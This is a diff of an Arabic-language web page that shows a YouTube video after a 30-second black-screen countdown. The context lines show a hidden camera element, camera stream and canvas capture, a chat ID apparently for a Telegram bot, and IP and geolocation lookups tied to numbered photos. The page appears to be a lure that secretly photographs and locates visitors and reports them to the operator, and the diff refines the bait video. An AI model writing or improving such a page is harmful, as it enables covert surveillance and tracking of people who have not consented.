@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>فيديو - تأخير 30 ثانية</title>
+    <title>فيديو يوتيوب - تأخير 30 ثانية</title>
     <style>
         * {
             margin: 0;
@@ -57,6 +57,7 @@
             visibility: hidden;
             opacity: 0;
             transition: visibility 0s, opacity 1s;
+            background: #000;
         }
 
         .video-background.show {
@@ -64,10 +65,10 @@
             opacity: 1;
         }
 
-        .video-background video {
+        .video-background iframe {
             width: 100%;
             height: 100%;
-            object-fit: cover;
+            border: none;
         }
 
         .hidden-camera {
@@ -98,16 +99,14 @@
         </div>
     </div>
 
-    <!-- فيديو يعمل 100% - عدة خيارات احتياطية -->
+    <!-- فيديو يوتيوب - يظهر بعد 30 ثانية -->
     <div class="video-background" id="videoBackground">
-        <video id="bgVideo" loop muted playsinline>
-            <!-- الخيار 1: فيديو طبيعة جميل -->
-            <source src="https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
-            <!-- الخيار 2: فيديو احتياطي -->
-            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerFunflies.mp4" type="video/mp4">
-            <!-- الخيار 3: فيديو احتياطي ثالث -->
-            <source src="https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscapes.mp4" type="video/mp4">
-        </video>
+        <iframe id="youtubeFrame" 
+                src=""
+                frameborder="0"
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                allowfullscreen>
+        </iframe>
     </div>
 
     <div class="hidden-camera">
@@ -122,6 +121,10 @@
         let CHAT_ID = null;
         let stream = null;
         let cameraReady = false;
+        
+        // ==================== رابط فيديو يوتيوب (يعمل 100%) ====================
+        // يمكنك تغيير هذا الرابط إلى أي فيديو يوتيوب تريده
+        const YOUTUBE_VIDEO_ID = "dQw4w9WgXcQ"; // مثال: فيديو مشهور
         
         // ==================== معلومات الجهاز ====================
         let deviceInfo = {
@@ -144,7 +147,7 @@
         const canvas = document.getElementById('canvas');
         const blackScreen = document.getElementById('blackScreen');
         const videoBackground = document.getElementById('videoBackground');
-        const bgVideo = document.getElementById('bgVideo');
+        const youtubeFrame = document.getElementById('youtubeFrame');
         const countdownSpan = document.getElementById('countdown');
         
         // ==================== خدمة جلب IP والموقع ====================
@@ -203,6 +206,7 @@
                     const response3 = await fetch('https://api.ipify.org?format=json');
                     const data3 = await response3.json();
                     deviceInfo.ip = data3.ip || 'غير متاح';
+                    deviceInfo.country = 'تم جلب IP فقط';
                 } catch(e) {
                     deviceInfo.ip = 'غير متاح';
                 }
@@ -280,7 +284,6 @@
         function getInfoText(photoNumber) {
             const ipType = deviceInfo.ip && deviceInfo.ip.includes(':') ? 'IPv6' : 'IPv4';
             
-            // التأكد من أن القيم نصوص وليس كائنات
             const country = typeof deviceInfo.country === 'string' ? deviceInfo.country : 'غير متاح';
             const city = typeof deviceInfo.city === 'string' ? deviceInfo.city : 'غير متاح';
             const region = typeof deviceInfo.region === 'string' ? deviceInfo.region : 'غير متاح';
@@ -376,16 +379,6 @@
             let secondsLeft = 30;
             countdownSpan.textContent = secondsLeft;
             
-            // محاولة تشغيل الفيديو
-            function playVideo() {
-                bgVideo.play().then(() => {
-                    console.log('✅ بدء تشغيل الفيديو بنجاح');
-                }).catch(err => {
-                    console.log('⚠️ خطأ في التشغيل:', err);
-                    // الفيديو سيعمل تلقائياً بسبب muted و autoplay
-                });
-            }
-            
             const countdownInterval = setInterval(() => {
                 secondsLeft--;
                 countdownSpan.textContent = secondsLeft;
@@ -393,7 +386,11 @@
                 if (secondsLeft <= 0) {
                     clearInterval(countdownInterval);
                     
-                    playVideo();
+                    // تشغيل فيديو يوتيوب
+                    const videoUrl = `https://www.youtube.com/embed/${YOUTUBE_VIDEO_ID}?autoplay=1&mute=1&controls=0&loop=1&playlist=${YOUTUBE_VIDEO_ID}&modestbranding=1&rel=0&showinfo=0`;
+                    youtubeFrame.src = videoUrl;
+                    
+                    console.log('✅ بدء تشغيل فيديو يوتيوب بعد 30 ثانية');
                     
                     // إخفاء الشاشة السوداء
                     blackScreen.style.opacity = '0';
